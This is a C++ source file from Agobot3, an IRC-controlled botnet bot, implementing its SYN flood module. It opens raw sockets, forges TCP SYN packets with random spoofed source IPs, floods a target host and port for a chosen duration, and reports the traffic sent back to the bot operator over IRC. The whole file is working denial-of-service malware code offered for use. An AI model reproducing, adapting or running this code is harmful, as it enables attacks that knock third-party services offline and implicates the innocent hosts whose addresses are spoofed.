/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "utility.h"

long SYNFlood(char *target, int port, int len, int delay);

CDDOSSynFlood::CDDOSSynFlood() { m_szType="CDDOSSynFlood"; m_sDDOSName.Assign("synflood"); }

void CDDOSSynFlood::StartDDOS()
{	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: flooding %s port %u for %u seconds, %d ms delay.", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, m_iTime, m_iDelay);
	CString sReply; sReply.Format("%s: %s:%d [%i]", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, SYNFlood(m_sHost.Str(), m_iPort, m_iTime, m_iDelay)/1024/m_iTime);
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s", sReply.CStr()); }

long SendSyn(unsigned long TargetIP, unsigned long SpoofingIP, unsigned short TargetPort, int len, int delay)
{	int sock; sockaddr_in addr_in; IPHEADER ipHeader; TCPHEADER tcpHeader; PSDHEADER psdHeader;
	char szSendBuf[60]={0}; int rect; unsigned long lTimerCount=0; long i=0; bool bRandPort=false;
	unsigned long lSpoofIP; char *szSpoofIP=(char*)&lSpoofIP;

	szSpoofIP[0]=(char)brandom(0, 255); szSpoofIP[1]=(char)brandom(0, 255);
	szSpoofIP[2]=(char)brandom(0, 255); szSpoofIP[3]=(char)brandom(0, 255);

	if(TargetPort==0) { bRandPort=true; TargetPort=brandom(1000, 10000); }

#ifdef WIN32
	BOOL flag=TRUE;
#else
	bool flag=true;
#endif

#ifdef WIN32
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); if(sock==INVALID_SOCKET) return false;
#else
	sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW); if(sock==INVALID_SOCKET) return false;
#endif

	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag))==SOCKET_ERROR) return false;

	addr_in.sin_family=AF_INET; addr_in.sin_port=htons(TargetPort); addr_in.sin_addr.s_addr=TargetIP;

	ipHeader.h_verlen=(4<<4|sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1; ipHeader.frag_and_flags=0; ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP; ipHeader.checksum=0; ipHeader.destIP=TargetIP;
	tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); tcpHeader.th_flag=2;
	tcpHeader.th_win=htons(16384); tcpHeader.th_urp=0; tcpHeader.th_ack=0;

	lTimerCount=GetTickCount();

	while(g_pMainCtrl->m_cDDOS.m_bDDOSing)
	{	i++;

		tcpHeader.th_sum=0; tcpHeader.th_dport=htons(TargetPort);

		psdHeader.daddr=ipHeader.destIP; psdHeader.mbz=0; psdHeader.ptcl=IPPROTO_TCP;
		psdHeader.tcpl=htons(sizeof(tcpHeader));
		ipHeader.sourceIP=htonl(lSpoofIP);
		//ipHeader.sourceIP=htonl(SpoofingIP++);

		tcpHeader.th_sport=htons((rand()%1001)+1000); // source port
		tcpHeader.th_seq=htons((rand()<<16)|rand());

		psdHeader.saddr=ipHeader.sourceIP;

		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.th_sum=checksum((unsigned short *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
		ipHeader.checksum=checksum((unsigned short *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));
		
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		
		rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
		if(rect==SOCKET_ERROR) return false;
		
		if((GetTickCount()-lTimerCount)/1000>len) break;
		
		if(bRandPort) { TargetPort=brandom(1000, 10000); }
		szSpoofIP[0]=(char)brandom(0, 255); szSpoofIP[1]=(char)brandom(0, 255);
		szSpoofIP[2]=(char)brandom(0, 255); szSpoofIP[3]=(char)brandom(0, 255);

		Sleep(delay); }
	
#ifdef _WIN32
	closesocket(sock);
#else
	close(sock);
#endif
	
	return (sizeof(ipHeader)+sizeof(tcpHeader)*i); }

long SYNFlood(char *target, int port, int len, int delay)
{	unsigned long TargetIP; unsigned long SpoofIP;
	CDNS cDNS; TargetIP=cDNS.ResolveAddress(target); SpoofIP=TargetIP+((rand()%512)+256);
	return SendSyn(TargetIP, SpoofIP, port, len, delay); }
